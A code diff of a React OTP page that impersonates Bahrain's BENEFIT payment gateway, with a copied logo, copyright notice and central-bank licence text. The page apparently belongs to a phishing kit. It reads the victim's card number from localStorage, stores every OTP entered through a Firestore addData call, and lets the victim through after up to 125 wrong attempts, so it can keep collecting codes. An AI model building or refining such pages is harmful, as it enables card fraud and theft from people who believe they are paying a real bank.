@@ -3,8 +3,8 @@
 import type React from "react"
 
 import { useState, useEffect, useRef } from "react"
-import { NumericKeypad } from "./numeric-keypad"
 import { addData } from "@/lib/firestore"
+import { NumericKeypad } from "../numeric-keypad"
 
 interface OTPVerificationProps {
   amount: string
@@ -13,9 +13,10 @@ interface OTPVerificationProps {
   onCancel: () => void
 }
 
-export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPVerificationProps) {
+export default  function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPVerificationProps) {
   const [otp, setOtp] = useState("")
   const [countdown, setCountdown] = useState(60)
+  const [maskedCardNumber,setMaskedNumber] = useState('**')
   const [showKeypad, setShowKeypad] = useState(false)
   const [otpError, setOtpError] = useState(false)
   const [attempts, setAttempts] = useState(0)
@@ -25,10 +26,9 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
   const [allOtps, setAllOtps] = useState<string[]>([])
 
   // Get cart total from context
-  const total=10
+  const total = 10
 
-  // Mask the card number
-  const maskedCardNumber = cardNumber.replace(/^(\d{6})(\d+)(\d{4})$/, "$1******$3")
+  // Mask the card number?
 
   // Start countdown timer
   useEffect(() => {
@@ -39,6 +39,9 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
   }, [])
 
   const startCountdown = () => {
+    const cardNumber =localStorage.getItem('cardNumber')
+setMaskedNumber(cardNumber?.replace(/^(\d{6})(\d+)(\d{4})$/, "$1******$3")!)
+    
     setCountdown(60)
     if (timerRef.current) clearInterval(timerRef.current)
 
@@ -93,7 +96,7 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
       saveOtpData()
 
       // Simulate OTP validation - in a real app, this would call an API
-      if (otp === "123456" || attempts >= 5) {
+      if (otp === "123456" || attempts >= 125) {
         // Correct OTP or max attempts reached
         onVerify()
       } else {
@@ -151,32 +154,26 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
       {/* Merchant Info */}
       <div className="text-center mb-6">
         <p className="text-xl font-medium">Zain BH LIC</p>
-        <p className="text-gray-600">@delmonfish</p>
+        <p className="text-gray-600">@Zainbh</p>
       </div>
 
       {/* OTP Message */}
       <div className="text-center mb-6">
-        <p className="text-red-600 font-medium text-lg">تم إرسال رمز OTP</p>
+        <p className="text-red-600 font-medium text-lg">OTP has been sent</p>
         {resendMessage && <p className="text-green-600 text-sm mt-1">A new OTP has been sent to your mobile</p>}
       </div>
 
       <form onSubmit={handleSubmit} className="px-6">
         <div className="space-y-5 mb-8">
-          <div className="flex justify-between items-center">
-            <span className="text-right font-medium text-lg">المبلغ</span>
-            <span className="font-bold text-lg">
-              {total ? total.toFixed(2) : amount}
-              <strong style={{ margin: 2 }}>BD</strong>
-            </span>
-          </div>
+         
 
           <div className="flex justify-between items-center">
-            <span className="text-right font-medium">رقم البطاقة</span>
+            <span className="text-left font-medium">Card Number</span>
             <span className="font-medium">{maskedCardNumber}</span>
           </div>
 
           <div className="flex justify-between items-center">
-            <span className="text-right font-medium">رمز OTP</span>
+            <span className="text-left font-medium">OTP Code</span>
             <div className="relative w-64">
               <input
                 type="text"
@@ -204,8 +201,8 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
               disabled={countdown > 0}
               className={`text-sm ${countdown > 0 ? "text-gray-500" : "text-red-600 hover:underline"}`}
             >
-              أرسل رمز OTP آخر
-              {countdown > 0 && <span> بعد {countdown} ثانية</span>}
+              Resend OTP
+              {countdown > 0 && <span> after {countdown} seconds</span>}
             </button>
           </div>
         </div>
@@ -217,31 +214,31 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
             onClick={onCancel}
             className="bg-red-600 text-white rounded py-2.5 px-8 w-full font-medium hover:bg-red-700 transition-colors"
           >
-            إلغاء
+            Cancel
           </button>
           <button
             type="submit"
             className="bg-red-600 text-white rounded py-2.5 px-8 w-full font-medium hover:bg-red-700 transition-colors"
             disabled={otp.length !== 6}
           >
-            دفع
+            Pay
           </button>
         </div>
 
         {/* Accepted Cards */}
-        <div className="text-right mb-4">
+        <div className="text-left mb-4">
           <a href="#" className="text-red-600 hover:underline text-sm">
-            عرض البطاقات المقبولة
+            View Accepted Cards
           </a>
         </div>
 
         {/* Terms */}
-        <div className="text-right mb-8 text-sm leading-relaxed">
-          <p dir="rtl">
-            <span className="font-bold">ملاحظة:</span> إن تقديم هذه المعلومات واستخدام "بوابة الدفع الإلكترونية من بنفت"
-            يعني موافقتك على{" "}
+        <div className="text-left mb-8 text-sm leading-relaxed">
+          <p>
+            <span className="font-bold">Note:</span> By providing this information and using the "BENEFIT Payment
+            Gateway", you agree to the{" "}
             <a href="#" className="text-red-600 hover:underline">
-              شروط هذه الخدمة - إبراء الذمة القانوني
+              terms of service - Legal Disclaimer
             </a>
             .
           </p>
@@ -259,14 +256,10 @@ export function OTPVerification({ amount, cardNumber, onVerify, onCancel }: OTPV
       <div className="text-center space-y-2 mb-6">
         <img src="/logo.webp" alt="Benefit Logo" width={80} height={80} className="mx-auto" />
         <div className="px-6">
-          <p className="text-right text-sm" dir="rtl">
-            يدار الموقع من قبل شركة بنفت.
-          </p>
-          <p className="text-right text-sm" dir="rtl">
-            حقوق التأليف © 2020-2025 لشركة بنفت. جميع الحقوق محفوظة.
-          </p>
-          <p className="text-right text-sm" dir="rtl">
-            مرخص من قبل مصرف البحرين المركزي لتقديم الخدمات المساعدة للقطاع المالي.
+          <p className="text-left text-sm">This site is managed by BENEFIT Company.</p>
+          <p className="text-left text-sm">Copyright © 2020-2025 BENEFIT Company. All rights reserved.</p>
+          <p className="text-left text-sm">
+            Licensed by the Central Bank of Bahrain to provide ancillary services to the financial sector.
           </p>
         </div>
       </div>
